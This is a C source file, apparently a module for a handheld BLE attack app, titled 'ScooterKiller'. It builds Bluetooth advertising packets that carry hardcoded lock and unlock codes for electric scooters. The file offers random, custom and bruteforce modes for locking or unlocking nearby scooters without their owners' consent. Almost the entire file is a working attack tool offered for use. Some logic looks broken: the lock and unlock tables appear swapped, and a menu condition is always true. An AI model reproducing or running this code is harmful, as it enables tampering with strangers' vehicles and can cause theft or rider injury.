#include "scooterkiller.h"
#include "_protocols.h"

// Hacked by @KaoXx
// Discovered by @KaoXx


// Structure to represent the Scooterkiller mode and its name
typedef struct {
    uint32_t value;
    const char* name;
} ScooterkillerMode;

// Arrays to store lock and unlock modes
static const ScooterkillerMode Lock[] = {
    {0x1900B5, "Lock 1"}, {0x1B005D, "Lock 2"}, {0x1F00EB, "Lock 3"}, {0x2100D1, "Lock 4"},
    {0x23001C, "Lock 5"}, {0x19002B, "Lock 6"}, {0x1B0056, "Lock 7"}, {0x1D000C, "Lock 8"},
    {0x1F0011, "Lock 9"}, {0x21006B, "Lock 10"}, {0x2300A9, "Lock 11"}, {0x190037, "Lock 12"},
    {0x1B0070, "Lock 13"}, {0x1D0047, "Lock 14"}, {0x1F00EA, "Lock 15"}, {0x21001A, "Lock 16"},
    {0x2300B5, "Lock 17"}, {0x1A00EB, "Lock 18"}, {0x1C0048, "Lock 19"}, {0x1E002B, "Lock 20"},
    {0x200029, "Lock 21"}, {0x220027, "Lock 22"}, {0x240013, "Lock 23"}, {0x1D00C, "Lock 24"}
};

static const ScooterkillerMode Unlock[] = {
    {0x18007D, "Unlock 1"}, {0x1A0064, "Unlock 2"}, {0x1C00C6, "Unlock 3"}, {0x1E000E, "Unlock 4"},
    {0x200098, "Unlock 5"}, {0x2200F0, "Unlock 6"}, {0x180054, "Unlock 7"}, {0x1A00D9, "Unlock 8"},
    {0x1C0004, "Unlock 9"}, {0x1E0041, "Unlock 10"}, {0x200093, "Unlock 11"}, {0x2200DC, "Unlock 12"},
    {0x1900B9, "Unlock 13"}, {0x1B0039, "Unlock 14"}, {0x1D0033, "Unlock 15"}, {0x1F00A2, "Unlock 16"},
    {0x210054, "Unlock 17"}, {0x230014, "Unlock 18"}, {0x1800D7, "Unlock 19"}, {0x1A008B, "Unlock 20"},
    {0x1C0066, "Unlock 21"}, {0x1E0000, "Unlock 22"}, {0x2000B5, "Unlock 23"}, {0x220087, "Unlock 24"}
};

// Array of mode configurations, each containing a pointer to the mode array and its count
static const struct {
    const ScooterkillerMode* modes;
    uint8_t count;
} modes[] = {
    [0] = {Lock, sizeof(Lock) / sizeof(Lock[0])},
    [ScooterUnlock] = {Lock, sizeof(Lock) / sizeof(Lock[0])},
    [ScooterLock] = {Unlock, sizeof(Unlock) / sizeof(Unlock[0])}
};

static const char* get_name(const Payload* payload) {
    UNUSED(payload);
    return "ScooterKiller";
}

static void make_packet(uint8_t* _size, uint8_t** _packet, Payload* payload) {
    ScooterCfg* cfg = payload ? &payload->cfg.scooterkiller : NULL;

    ScooterState state;
    if(cfg && cfg->state != 0x00) {
        state = cfg->state;
    } else {
        const ScooterState states[] = {
            ScooterLock,
            ScooterUnlock,
        };
        state = states[rand() % COUNT_OF(states)];
    }

    uint32_t mode;
    switch(cfg ? payload->mode : PayloadModeRandom) {
    case PayloadModeRandom:
    default:
        mode = modes[state].modes[rand() % modes[state].count].value;
        break;
    case PayloadModeValue:
        mode = cfg->mode;
        break;
    case PayloadModeBruteforce:
        mode = cfg->mode = payload->bruteforce.value;
        break;
    }

    uint8_t size = 22;
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = 2; // Size
    packet[i++] = 0xDD; // AD Type (Flags)
    packet[i++] = 0xAD; // Flags

    packet[i++] = 14; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0xFF; // Company ID (Typo Products, LLC)
    packet[i++] = 0xDD; // ...
    packet[i++] = 0xAD;
    packet[i++] = 0xD4; 
    packet[i++] = 0x5A;
    packet[i++] = 0x8B;
    packet[i++] = 0xD5;
    packet[i++] = 0x59;
    packet[i++] = 0x48;
    packet[i++] = 0x81;
    packet[i++] = (mode >> 0x10) & 0xFF;
    packet[i++] = (mode >> 0x08) & 0xFF;
    packet[i++] = (mode >> 0x00) & 0xFF;

    packet[i++] = 3; // Size
    packet[i++] = 0x03; // AD Type (Service UUID List)
    packet[i++] = 0x8F; // Service UUID (Unregistered)
    packet[i++] = 0xAE; // ...

    *_size = size;
    *_packet = packet;
}

enum {
    _ConfigExtraStart = ConfigExtraStart,
    ConfigMode,
    ConfigCOUNT,
};
static void config_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    scene_manager_set_scene_state(ctx->scene_manager, SceneConfig, index);
    if (index == ConfigMode) {
        scene_manager_next_scene(ctx->scene_manager, SceneScooterKillerMode);
    } else {
        ctx->fallback_config_enter(ctx, index);
    }
}
static void mode_changed(VariableItem* item) {
    Payload* payload = variable_item_get_context(item);
    ScooterCfg* cfg = &payload->cfg.scooterkiller;
    uint8_t index = variable_item_get_current_value_index(item);

    if (index) {
        index--;
        payload->mode = PayloadModeValue;
        cfg->mode = modes[cfg->state].modes[index].value;
        variable_item_set_current_value_text(item, modes[cfg->state].modes[index].name);
    } else {
        payload->mode = PayloadModeRandom;
        variable_item_set_current_value_text(item, "Random");
    }
}
static void extra_config(Ctx* ctx) {
    Payload* payload = &ctx->attack->payload;
    ScooterCfg* cfg = &payload->cfg.scooterkiller;
    VariableItemList* list = ctx->variable_item_list;
    VariableItem* item;
    uint8_t value_index;

    item = variable_item_list_add(
        list, "Scooter Mode", modes[cfg->state].count + 1, mode_changed, payload);
    const char* mode_name = NULL;
    char mode_name_buf[9];
    switch(payload->mode) {
    case PayloadModeRandom:
    default:
        mode_name = "Random";
        value_index = 0;
        break;
    case PayloadModeValue:
        for(uint8_t i = 0; i < modes[cfg->state].count; i++) {
            if(cfg->mode == modes[cfg->state].modes[i].value) {
                mode_name = modes[cfg->state].modes[i].name;
                value_index = i + 1;
                break;
            }
        }
        if(!mode_name) {
            snprintf(mode_name_buf, sizeof(mode_name_buf), "%06lX", cfg->mode);
            mode_name = mode_name_buf;
            value_index = modes[cfg->state].count + 1;
        }
        break;
    case PayloadModeBruteforce:
        mode_name = "Bruteforce Lock/Unlock";
        value_index = modes[cfg->state].count + 1;
        break;
    }
    variable_item_set_current_value_index(item, value_index);
    variable_item_set_current_value_text(item, mode_name);

    variable_item_list_set_enter_callback(list, config_callback, ctx);
}

static uint8_t config_count(const Payload* payload) {
    UNUSED(payload);
    return ConfigCOUNT - ConfigExtraStart - 1;
}

const Protocol protocol_scooterKiller = {
    .icon = &I_heart,
    .get_name = get_name,
    .make_packet = make_packet,
    .extra_config = extra_config,
    .config_count = config_count,
};

static void mode_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ScooterCfg* cfg = &payload->cfg.scooterkiller;
    if(index == 0) {
        payload->mode = PayloadModeRandom;
        view_dispatcher_send_custom_event(ctx->view_dispatcher, 0);
    } else if(index == modes[cfg->state].count + 1U) {
        scene_manager_next_scene(ctx->scene_manager, SceneScooterKillerMode);
    } else if(modes[cfg->state].count + 2U) {
        payload->mode = PayloadModeBruteforce;
        payload->bruteforce.counter = 0;
        payload->bruteforce.value = cfg->mode;
        payload->bruteforce.size = 3;
        view_dispatcher_send_custom_event(ctx->view_dispatcher, 0);
    } else {
        payload->mode = PayloadModeValue;
        cfg->mode = modes[cfg->state].modes[index - 1].value;
        view_dispatcher_send_custom_event(ctx->view_dispatcher, 0);
    }
}
void scene_scooterkiller_mode_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ScooterCfg* cfg = &payload->cfg.scooterkiller;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;

    submenu_add_item(submenu, "Random", 0, mode_callback, ctx);
    if(payload->mode == PayloadModeRandom) {
        selected = 0;
    }

    bool found = false;
    for(uint8_t i = 0; i < modes[cfg->state].count; i++) {
        submenu_add_item(submenu, modes[cfg->state].modes[i].name, i + 1, mode_callback, ctx);
        if(!found && payload->mode == PayloadModeValue &&
           cfg->mode == modes[cfg->state].modes[i].value) {
            found = true;
            selected = i + 1;
        }
    }
    submenu_add_item(submenu, "Custom", modes[cfg->state].count + 1, mode_callback, ctx);
    if(!found && payload->mode == PayloadModeValue) {
        selected = modes[cfg->state].count + 1;
    }

    submenu_add_item(submenu, "Bruteforce", modes[cfg->state].count + 2, mode_callback, ctx);
    if(payload->mode == PayloadModeBruteforce) {
        selected = modes[cfg->state].count + 2;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_scooterkiller_mode_on_event(void* _ctx, SceneManagerEvent event) {
    Ctx* ctx = _ctx;
    if(event.type == SceneManagerEventTypeCustom) {
        scene_manager_previous_scene(ctx->scene_manager);
        return true;
    }
    return false;
}
void scene_scooterkiller_mode_on_exit(void* _ctx) {
    Ctx* ctx = _ctx;
    submenu_reset(ctx->submenu);
}

static void mode_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ScooterCfg* cfg = &payload->cfg.scooterkiller;
    payload->mode = PayloadModeValue;
    cfg->mode =
        (ctx->byte_store[0] << 0x10) + (ctx->byte_store[1] << 0x08) + (ctx->byte_store[2] << 0x00);
    view_dispatcher_send_custom_event(ctx->view_dispatcher, 0);
}
void scene_scooterkiller_mode_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ScooterCfg* cfg = &payload->cfg.scooterkiller;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Enter custom Scooter Mode");

    ctx->byte_store[0] = (cfg->mode >> 0x10) & 0xFF;
    ctx->byte_store[1] = (cfg->mode >> 0x08) & 0xFF;
    ctx->byte_store[2] = (cfg->mode >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, mode_custom_callback, NULL, ctx, (void*)ctx->byte_store, 3);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_scooterkiller_mode_custom_on_event(void* _ctx, SceneManagerEvent event) {
    Ctx* ctx = _ctx;
    if(event.type == SceneManagerEventTypeCustom) {
        scene_manager_previous_scene(ctx->scene_manager);
        scene_manager_previous_scene(ctx->scene_manager);
        return true;
    }
    return false;
}
void scene_scooterkiller_mode_custom_on_exit(void* _ctx) {
    UNUSED(_ctx);
}
